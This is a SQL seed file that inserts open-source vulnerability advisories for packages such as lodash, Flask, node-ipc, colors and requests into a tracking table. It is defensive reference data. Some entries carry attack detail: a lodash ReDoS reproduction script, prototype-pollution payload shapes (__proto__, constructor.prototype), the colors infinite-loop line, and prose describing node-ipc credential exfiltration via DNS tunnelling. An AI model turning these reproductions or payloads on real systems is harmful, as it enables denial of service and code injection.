INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-g7vw-43xg-8m4h', 'OSV', 'com.liferay.portal:release.portal.bom', 'maven', 'SQL injection in Liferay Portal', 'SQL injection vulnerability in the upgrade process for SQL Server in Liferay Portal 7.3.1 through 7.4.3.17, and Liferay DXP 7.3 before update 6, and 7.4 before update 18 allows attackers to execute arbitrary SQL commands via the name of a database table''s primary key index. This vulnerability is only exploitable when chained with other attacks. To exploit this vulnerability, the attacker must modify the database and wait for the application to be upgraded.', '["7.3.1", "7.3.1-1", "7.3.2", "7.3.2-1", "7.3.3", "7.3.3-1", "7.3.4", "7.3.5", "7.3.6", "7.3.7", "7.4.0", "7.4.1", "7.4.1-1", "7.4.2", "7.4.2-1", "7.4.3.10", "7.4.3.11", "7.4.3.12", "7.4.3.13", "7.4.3.14", "7.4.3.15", "7.4.3.16", "7.4.3.17", "7.4.3.4", "7.4.3.5", "7.4.3.6", "7.4.3.7", "7.4.3.8", "7.4.3.9"]'::jsonb, '0.0', '2023-05-24 18:30:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-44f4-gvwj-6qg3', 'OSV', 'org.springframework.ai:spring-ai-redis-store', 'maven', 'Spring AI Redis Store has TAG Field Query Injection Through Improper Neutralization of Special Characters', 'In RedisFilterExpressionConverter of spring-ai-redis-store, when a user-controlled string is passed as a filter value for a TAG field, stringValue() inserts the value directly into the @field:{VALUE} RediSearch TAG block without escaping characters. This issue affects Spring AI: from 1.0.0 before 1.0.5, from 1.1.0 before 1.1.4.', '["1.1.0", "1.1.0-M1", "1.1.0-M2", "1.1.0-M3", "1.1.0-M4", "1.1.0-RC1", "1.1.1", "1.1.2", "1.1.3"]'::jsonb, '0.0', '2026-03-27 06:31:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-97cq-f4jm-mv8h', 'OSV', 'io.undertow:undertow-core', 'maven', 'Undertow Denial of Service vulnerability', 'A flaw was found in Undertow package. Using the FormAuthenticationMechanism, a malicious user could trigger a Denial of Service by sending crafted requests, leading the server to an OutofMemory error, exhausting the server''s memory.', '["2.3.0.Alpha1", "2.3.0.Alpha2", "2.3.0.Beta1", "2.3.0.Final", "2.3.1.Final", "2.3.10.Final", "2.3.11.Final", "2.3.12.Final", "2.3.2.Final", "2.3.3.Final", "2.3.4.Final", "2.3.5.Final", "2.3.6.Final", "2.3.7.Final", "2.3.8.Final", "2.3.9.Final"]'::jsonb, '0.0', '2024-11-07 12:30:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5rqg-jm4f-cqx7', 'OSV', 'colors', 'npm', 'Infinite loop causing Denial of Service in colors', 'colors is a library for including colored text in node.js consoles. Between 07 and 09 January 2022, colors versions 1.4.1, 1.4.2, and 1.4.44-liberty-2 were published including malicious code that caused a Denial of Service due to an infinite loop. Software dependent on these versions experienced the printing of randomized characters to console and an infinite loop resulting in unbound system resource consumption.

Users of colors relying on these specific versions should downgrade to version 1.4.0.
', '["1.4.44-liberty-2"]'::jsonb, '0.0', '2022-01-10 17:29:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gh88-3pxp-6fm8', 'OSV', 'colors', 'npm', 'Infinite Loop in colors.js', 'The package colors after 1.4.0 are vulnerable to Denial of Service (DoS) that was introduced through an infinite loop in the americanFlag module. Unfortunately this appears to have been a purposeful attempt by a maintainer of colors to make the package unusable, other maintainers'' controls over this package appear to have been revoked in an attempt to prevent them from fixing the issue. Vulnerable Code js for (let i = 666; i < Infinity; i++;) { Alternative Remediation Suggested * Pin dependancy to 1.4.0', '[]'::jsonb, '0.0', '2022-01-21 23:39:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-mh6f-8j2x-4483', 'OSV', 'event-stream', 'npm', 'Critical severity vulnerability that affects event-stream and flatmap-stream', 'The NPM package `flatmap-stream` is considered malicious.  A malicious actor added this package as a dependency to the NPM `event-stream` package in version `3.3.6`.  Users of `event-stream` are encouraged to downgrade to the last non-malicious version, `3.3.4`, or upgrade to the latest  4.x version. 

Users of `flatmap-stream` are encouraged to remove the dependency entirely.
', '[]'::jsonb, '0.0', '2018-11-26 23:58:21+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5w9c-rv96-fr7g', 'OSV', 'faker', 'npm', 'Removal of functional code in faker.js', 'Faker.js helps users create large amounts of data for testing and development. The maintainer deliberately removed the functional code from this package. This appears to be a purposeful and successful attempt to make the package unusable. This is related to the colors.js [CVE-2021-23567](https://github.com/advisories/GHSA-gh88-3pxp-6fm8). 

The functional code for this package was forked and can be found [here](https://github.com/faker-js/faker). ', '["6.6.6"]'::jsonb, '0.0', '2022-03-22 19:28:24+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4grg-w6v8-c28g', 'OSV', 'flask', 'pypi', 'Flask uses fallback key instead of current signing key', 'In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.

Signing is provided by the `itsdangerous` library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.

Sites that have opted-in to use key rotation by setting `SECRET_KEY_FALLBACKS` are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss.', '["3.1.0"]'::jsonb, '0.0', '2025-05-13 20:25:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-562c-5r94-xh97', 'OSV', 'flask', 'pypi', 'Flask is vulnerable to Denial of Service via incorrect encoding of JSON data', 'The Pallets Project flask version Before 0.12.3 contains a CWE-20: Improper Input Validation vulnerability in flask that can result in Large amount of memory usage possibly leading to denial of service. This attack appear to be exploitable via Attacker provides JSON data in incorrect encoding. This vulnerability appears to have been fixed in 0.12.3.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9"]'::jsonb, '0.0', '2018-08-23 19:10:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5wv5-4vpf-pj6m', 'OSV', 'flask', 'pypi', 'Pallets Project Flask is vulnerable to Denial of Service via Unexpected memory usage', 'The Pallets Project Flask before 1.0 is affected by unexpected memory usage. The impact is denial of service. The attack vector is crafted encoded JSON data. The fixed version is 1. NOTE this may overlap CVE-2018-1000656.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.12.3", "0.12.4", "0.12.5", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9"]'::jsonb, '0.0', '2019-07-19 16:12:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-68rp-wp8r-4726', 'OSV', 'flask', 'pypi', 'Flask session does not add `Vary: Cookie` header when accessed in some ways', 'When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.

The severity depends on the application''s use of the session, and the cache''s behavior regarding cookies. The risk depends on all these conditions being met.

1. The application must be hosted behind a caching proxy that does not ignore responses with cookies.
2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.12.3", "0.12.4", "0.12.5", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9", "1.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.1.4", "2.0.0", "2.0.0rc1", "2.0.0rc2", "2.0.1", "2.0.2", "2.0.3", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.2.5", "2.3.0", "2.3.1", "2.3.2", "2.3.3", "3.0.0", "3.0.1", "3.0.2", "3.0.3", "3.1.0", "3.1.1", "3.1.2"]'::jsonb, '0.0', '2026-02-19 20:45:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-m2qf-hxjv-5gpq', 'OSV', 'flask', 'pypi', 'Flask vulnerable to possible disclosure of permanent session cookie due to missing Vary: Cookie header', 'When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client''s `session` cookie to other clients. The severity depends on the application''s use of the session, and the proxy''s behavior regarding cookies. The risk depends on _all_ these conditions being met.

1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).
2. The application does not access or modify the session at any point during a request.
4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).
5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.

This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.12.3", "0.12.4", "0.12.5", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9", "1.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.1.4", "2.0.0", "2.0.0rc1", "2.0.0rc2", "2.0.1", "2.0.2", "2.0.3", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4"]'::jsonb, '0.0', '2023-05-01 19:22:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2018-66', 'OSV', 'flask', 'pypi', '', 'The Pallets Project flask version Before 0.12.3 contains a CWE-20: Improper Input Validation vulnerability in flask that can result in Large amount of memory usage possibly leading to denial of service. This attack appear to be exploitable via Attacker provides JSON data in incorrect encoding. This vulnerability appears to have been fixed in 0.12.3. NOTE: this may overlap CVE-2019-1010083.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9"]'::jsonb, '0.0', '2018-08-20 19:31:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2019-179', 'OSV', 'flask', 'pypi', '', 'The Pallets Project Flask before 1.0 is affected by: unexpected memory usage. The impact is: denial of service. The attack vector is: crafted encoded JSON data. The fixed version is: 1. NOTE: this may overlap CVE-2018-1000656.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.12.3", "0.12.4", "0.12.5", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9"]'::jsonb, '0.0', '2019-07-17 14:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2023-62', 'OSV', 'flask', 'pypi', '', 'Flask is a lightweight WSGI web application framework. When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by the proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client''s `session` cookie to other clients. The severity depends on the application''s use of the session and the proxy''s behavior regarding cookies. The risk depends on all these conditions being met.

1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
2. The application sets `session.permanent = True`
3. The application does not access or modify the session at any point during a request.
4. `SESSION_REFRESH_EACH_REQUEST` enabled (the default).
5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.

This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified. This issue has been fixed in versions 2.3.2 and 2.2.5.', '["0.1", "0.10", "0.10.1", "0.11", "0.11.1", "0.12", "0.12.1", "0.12.2", "0.12.3", "0.12.4", "0.12.5", "0.2", "0.3", "0.3.1", "0.4", "0.5", "0.5.1", "0.5.2", "0.6", "0.6.1", "0.7", "0.7.1", "0.7.2", "0.8", "0.8.1", "0.9", "1.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.1.4", "2.0.0", "2.0.0rc1", "2.0.0rc2", "2.0.1", "2.0.2", "2.0.3", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.3.0", "2.3.1"]'::jsonb, '0.0', '2023-05-02 18:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-29mw-wpgm-hmr9', 'OSV', 'lodash', 'npm', 'Regular Expression Denial of Service (ReDoS) in lodash', 'All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. 

Steps to reproduce (provided by reporter Liyuan Chen):
```js
var lo = require(''lodash'');

function build_blank(n) {
    var ret = "1"
    for (var i = 0; i < n; i++) {
        ret += " "
    }
    return ret + "1";
}
var s = build_blank(50000) var time0 = Date.now();
lo.trim(s) 
var time_cost0 = Date.now() - time0;
console.log("time_cost0: " + time_cost0);
var time1 = Date.now();
lo.toNumber(s) var time_cost1 = Date.now() - time1;
console.log("time_cost1: " + time_cost1);
var time2 = Date.now();
lo.trimEnd(s);
var time_cost2 = Date.now() - time2;
console.log("time_cost2: " + time_cost2);
```', '[]'::jsonb, '0.0', '2022-01-06 20:30:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-35jh-r3h4-6jhm', 'OSV', 'lodash', 'npm', 'Command Injection in lodash', '`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.', '[]'::jsonb, '0.0', '2021-05-06 16:05:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4xc9-xhrj-v574', 'OSV', 'lodash', 'npm', 'Prototype Pollution in lodash', 'Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. 

The vulnerable functions are ''defaultsDeep'', ''merge'', and ''mergeWith'' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.11 or later.', '[]'::jsonb, '0.0', '2019-02-07 18:16:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-f23m-r3pf-42rh', 'OSV', 'lodash', 'npm', 'lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`', '### Impact

Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

### Patches

This issue is patched in 4.18.0.

### Workarounds

None. Upgrade to the patched version.', '[]'::jsonb, '0.0', '2026-04-01 23:50:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-fvqr-27wr-82fm', 'OSV', 'lodash', 'npm', 'Prototype Pollution in lodash', 'Versions of `lodash` before 4.17.5 are vulnerable to prototype pollution. 

The vulnerable functions are ''defaultsDeep'', ''merge'', and ''mergeWith'' which allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.17.5 or later.', '[]'::jsonb, '0.0', '2018-07-26 15:14:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jf85-cpcp-j695', 'OSV', 'lodash', 'npm', 'Prototype Pollution in lodash', 'Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.

## Recommendation

Update to version 4.17.12 or later.', '[]'::jsonb, '0.0', '2019-07-10 19:45:23+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-p6mc-m468-83gw', 'OSV', 'lodash', 'npm', 'Prototype Pollution in lodash', 'Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.

This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.', '[]'::jsonb, '0.0', '2020-07-15 19:15:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-r5fr-rjxr-66jc', 'OSV', 'lodash', 'npm', 'lodash vulnerable to Code Injection via `_.template` imports key names', '### Impact

The fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.

When an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.

Additionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.

### Patches

Users should upgrade to version 4.18.0.

The fix applies two changes:
1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)
2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated

### Workarounds

Do not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.', '[]'::jsonb, '0.0', '2026-04-01 23:51:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x5rq-j2xg-h7qm', 'OSV', 'lodash', 'npm', 'Regular Expression Denial of Service (ReDoS) in lodash', 'lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.', '[]'::jsonb, '0.0', '2019-07-19 16:13:07+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-xxjr-mmjv-4gpg', 'OSV', 'lodash', 'npm', 'Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions', '### Impact

Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. 

The issue permits deletion of properties but does not allow overwriting their original behavior.  

### Patches

This issue is patched on 4.17.23.', '[]'::jsonb, '0.0', '2026-01-21 23:01:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-3mpp-xfvh-qh37', 'OSV', 'node-ipc', 'npm', 'node-ipc behavior change', 'node-ipc starting in version 11.0.0 and prior to version 12.0.0 includes a message from the maintainer that is written to the user’s desktop. Please review the version changes before proceeding.', '[]'::jsonb, '0.0', '2022-03-16 23:54:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-8gr3-2gjw-jj7g', 'OSV', 'node-ipc', 'npm', 'Hidden functionality in node-ipc', 'The package node-ipc version 9.2.2 is vulnerable to hidden functionality that was introduced by the maintainer. The package uses a dependency that writes a file to disk that does not pertain to the functionality of the package and is not included in versions < 9.2.2.', '["9.2.2"]'::jsonb, '0.0', '2022-03-16 23:54:33+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-97m3-w2cp-4xx6', 'OSV', 'node-ipc', 'npm', 'Embedded Malicious Code in node-ipc', 'The package node-ipc versions 10.1.1 and 10.1.2 are vulnerable to embedded malicious code that was introduced by the maintainer. The malicious code was intended to overwrite arbitrary files dependent upon the geo-location of the user IP address. The maintainer removed the malicious code in version 10.1.3.', '[]'::jsonb, '0.0', '2022-03-16 23:54:32+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3744', 'OSV', 'node-ipc', 'npm', 'Malicious code in node-ipc (npm)', 'Three versions of node-ipc (9.1.6, 9.2.3, 12.0.1) were published to npm on May 14, 2026 by a compromised maintainer account (atiertant). Each version contains an identical 80KB obfuscated payload appended to node-ipc.cjs that steals over 100 categories of sensitive files (SSH keys, cloud provider credentials, .env files, Kubernetes configs, AI tool configurations) and exfiltrates them as gzipped tar archives via DNS tunneling.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (510f4689fde6aaa371d3326fe3cb2f9cf33c0821c38d0166359e870c5c836b8d)
node-ipc version 9.2.3 contains a heavily obfuscated module (node-ipc.cjs with hex-mangled identifiers such as _0xaed59b, _0x282d65, _0x4524e4, _0x41d0c3) introduced by the maintainer as protestware. The obfuscated code, loaded on module import, performs geolocation lookups against installer-side IP data and, for hosts resolving to certain regions, overwrites and/or creates files on the installer''s filesystem (historically writing ''peace'' messages to the user''s Desktop and, in related releases from the same maintainer, recursively overwriting files with a heart character). The payload fires whenever this package is loaded as a dependency — including transitively via popular downstream packages — without any consent from the installer. This is destructive, geolocation-gated sabotage executed on the installer''s machine at module load time.

## Source: ghsa-malware (d88176a3441259cee605e58c4967e970a8c7bec952fcaea81f0c2ba4f23c5e5e)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["9.1.6", "9.2.3", "12.0.1"]'::jsonb, '0.0', '2026-05-14 16:53:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-652x-xj99-gmcc', 'OSV', 'requests', 'pypi', 'Exposure of Sensitive Information to an Unauthorized Actor in Requests', 'Requests (aka python-requests) before 2.3.0 allows remote servers to obtain sensitive information by reading the Proxy-Authorization header in a redirected request.', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.2.0", "2.2.1"]'::jsonb, '0.0', '2022-05-14 02:09:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9hjg-9r4m-mvj7', 'OSV', 'requests', 'pypi', 'Requests vulnerable to .netrc credentials leak via malicious URLs', '### Impact

Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.

### Workarounds
For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).

### References
https://github.com/psf/requests/pull/6965
https://seclists.org/fulldisclosure/2025/Jun/2', '["0.0.1", "0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.6", "0.10.7", "0.10.8", "0.11.1", "0.11.2", "0.12.0", "0.12.01", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.13.4", "0.13.5", "0.13.6", "0.13.7", "0.13.8", "0.13.9", "0.14.0", "0.14.1", "0.14.2", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.3.4", "0.4.0", "0.4.1", "0.5.0", "0.5.1", "0.6.0", "0.6.1", "0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.7.4", "0.7.5", "0.7.6", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "2.0.0", "2.0.1", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.12.4", "2.12.5", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.16.2", "2.16.3", "2.16.4", "2.16.5", "2.17.0", "2.17.1", "2.17.2", "2.17.3", "2.18.0", "2.18.1", "2.18.2", "2.18.3", "2.18.4", "2.19.0", "2.19.1", "2.2.0", "2.2.1", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.27.1", "2.28.0", "2.28.1", "2.28.2", "2.29.0", "2.3.0", "2.30.0", "2.31.0", "2.32.0", "2.32.1", "2.32.2", "2.32.3", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2025-06-09 19:06:08+00') ON CONFLICT (id) DO NOTHING;
